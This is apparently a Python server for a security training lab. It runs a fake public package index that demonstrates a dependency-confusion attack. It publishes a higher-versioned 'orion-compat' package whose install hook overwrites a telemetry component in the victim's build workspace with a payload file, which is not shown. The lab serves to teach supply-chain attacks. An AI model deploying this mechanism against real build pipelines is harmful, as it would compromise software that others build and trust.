"""Attacker-controlled public package index for the Task 5 lab.

The supplier build resolves ``orion-compat`` from an internal index and from
this public one, and picks the highest version.  Publishing a higher version
here is the dependency-confusion step: the build downloads the public package
and runs its install hook, which replaces the telemetry component in the build
workspace.
"""

from __future__ import annotations

import io
import json
import re
import threading
import time
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit

PORT = 8080
FRONTEND_DIR = Path(__file__).resolve().parents[1] / "frontend"
PAYLOAD = Path("/app/payload/orion_support.py")
ASSETS = {
    "/": ("index.html", "text/html; charset=utf-8"),
    "/favicon.svg": ("favicon.svg", "image/svg+xml"),
    "/styles.css": ("styles.css", "text/css; charset=utf-8"),
    "/app.js": ("app.js", "text/javascript; charset=utf-8"),
}
NAME = re.compile(r"[a-z][a-z0-9-]{2,31}")
VERSION = re.compile(r"\d+\.\d+\.\d+")
INTERNAL = {"name": "orion-compat", "version": "1.4.2"}

lock = threading.RLock()
packages: dict[str, dict[str, dict[str, object]]] = {}

INSTALL_HOOK = '''"""Install hook shipped by the public orion-compat package."""
from pathlib import Path


def install(workspace):
    source = Path(__file__).resolve().parent / "orion_support.py"
    target = Path(workspace) / "orion_support.py"
    target.write_bytes(source.read_bytes())
'''


def _version_key(value: str) -> tuple[int, ...]:
    return tuple(int(part) for part in value.split("."))


def _archive(name: str, version: str) -> bytes:
    buffer = io.BytesIO()
    entries = {
        "orion_compat/__init__.py": f'"""orion-compat {version}."""\n__version__ = "{version}"\n',
        "install.py": INSTALL_HOOK,
        "orion_support.py": PAYLOAD.read_text(encoding="utf-8"),
    }
    with zipfile.ZipFile(buffer, "w") as package:
        for filename, content in entries.items():
            info = zipfile.ZipInfo(filename, date_time=(2020, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o100644 << 16
            package.writestr(info, content)
    return buffer.getvalue()


def _publish(name: str, version: str, description: str) -> None:
    if not NAME.fullmatch(name):
        raise ValueError("Package name must be lowercase letters, digits, and dashes.")
    if not VERSION.fullmatch(version):
        raise ValueError("Version must be major.minor.patch.")
    if not description or len(description) > 200:
        raise ValueError("Description must be 1 to 200 characters.")
    with lock:
        versions = packages.setdefault(name, {})
        versions[version] = {
            "version": version,
            "description": description,
            "published_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "downloads": 0,
        }


def _state() -> dict[str, object]:
    with lock:
        listed = []
        for name, versions in packages.items():
            listed.append({
                "name": name,
                "versions": [
                    dict(versions[version]) for version in sorted(versions, key=_version_key, reverse=True)
                ],
            })
    return {"packages": listed, "internal": dict(INTERNAL)}


class RegistryHandler(BaseHTTPRequestHandler):
    def send_bytes(self, status: int, body: bytes, content_type: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def send_json(self, status: int, value: dict[str, object]) -> None:
        self.send_bytes(status, json.dumps(value).encode("utf-8"), "application/json")

    def same_origin(self) -> bool:
        origin = urlsplit(self.headers.get("Origin", ""))
        host = self.headers.get("Host", "")
        return (
            origin.scheme == "http"
            and origin.hostname in {"localhost", "127.0.0.1", "::1"}
            and origin.netloc.lower() == host.lower()
            and origin.username is None
            and origin.password is None
        )

    def do_GET(self) -> None:  # noqa: N802
        path = urlsplit(self.path).path
        if path in ASSETS:
            filename, content_type = ASSETS[path]
            self.send_bytes(200, (FRONTEND_DIR / filename).read_bytes(), content_type)
            return
        if path == "/health":
            self.send_json(200, {"ready": True})
            return
        if path == "/api/state":
            self.send_json(200, _state())
            return
        parts = path.strip("/").split("/")
        if len(parts) == 3 and parts[:2] == ["api", "packages"]:
            name = parts[2]
            with lock:
                versions = packages.get(name)
            if not versions:
                self.send_json(404, {"error": "Package not found."})
                return
            listed = [dict(versions[version]) for version in sorted(versions, key=_version_key, reverse=True)]
            self.send_json(200, {"name": name, "versions": listed})
            return
        if len(parts) == 5 and parts[:2] == ["api", "packages"] and parts[4] == "archive":
            name, version = parts[2], parts[3]
            with lock:
                entry = packages.get(name, {}).get(version)
                if entry is not None:
                    entry["downloads"] = int(entry.get("downloads", 0)) + 1
            if entry is None:
                self.send_json(404, {"error": "Package version not found."})
                return
            self.send_bytes(200, _archive(name, version), "application/zip")
            return
        self.send_json(404, {"error": "Not found."})

    def do_POST(self) -> None:  # noqa: N802
        path = urlsplit(self.path).path
        if not self.same_origin() and self.headers.get("X-Presenter-Request") != "true":
            self.send_json(403, {"error": "State changes must come from this app's local origin."})
            return
        if self.headers.get_content_type() != "application/json":
            self.send_json(415, {"error": "Send a JSON request body."})
            return
        try:
            length = int(self.headers.get("Content-Length", "-1"))
            if length < 0 or length > 4096:
                raise ValueError("invalid body length")
            body = json.loads(self.rfile.read(length))
            if not isinstance(body, dict):
                raise ValueError("JSON body must be an object")
            if path == "/api/publish":
                name = str(body.get("name", "")).strip()
                version = str(body.get("version", "")).strip()
                description = str(body.get("description", "")).strip()
                _publish(name, version, description)
                self.send_json(200, {"message": f"Published {name} {version} to the public index."})
                return
            if path == "/api/reset":
                with lock:
                    packages.clear()
                self.send_json(200, {"message": "Public package index cleared."})
                return
            self.send_json(404, {"error": "Not found."})
        except (ValueError, json.JSONDecodeError, OSError) as exc:
            self.send_json(400, {"error": str(exc)})

    def log_message(self, _format: str, *_args: object) -> None:
        return


def main() -> None:
    server = ThreadingHTTPServer(("0.0.0.0", PORT), RegistryHandler)
    print("Public package index ready on port 8080", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
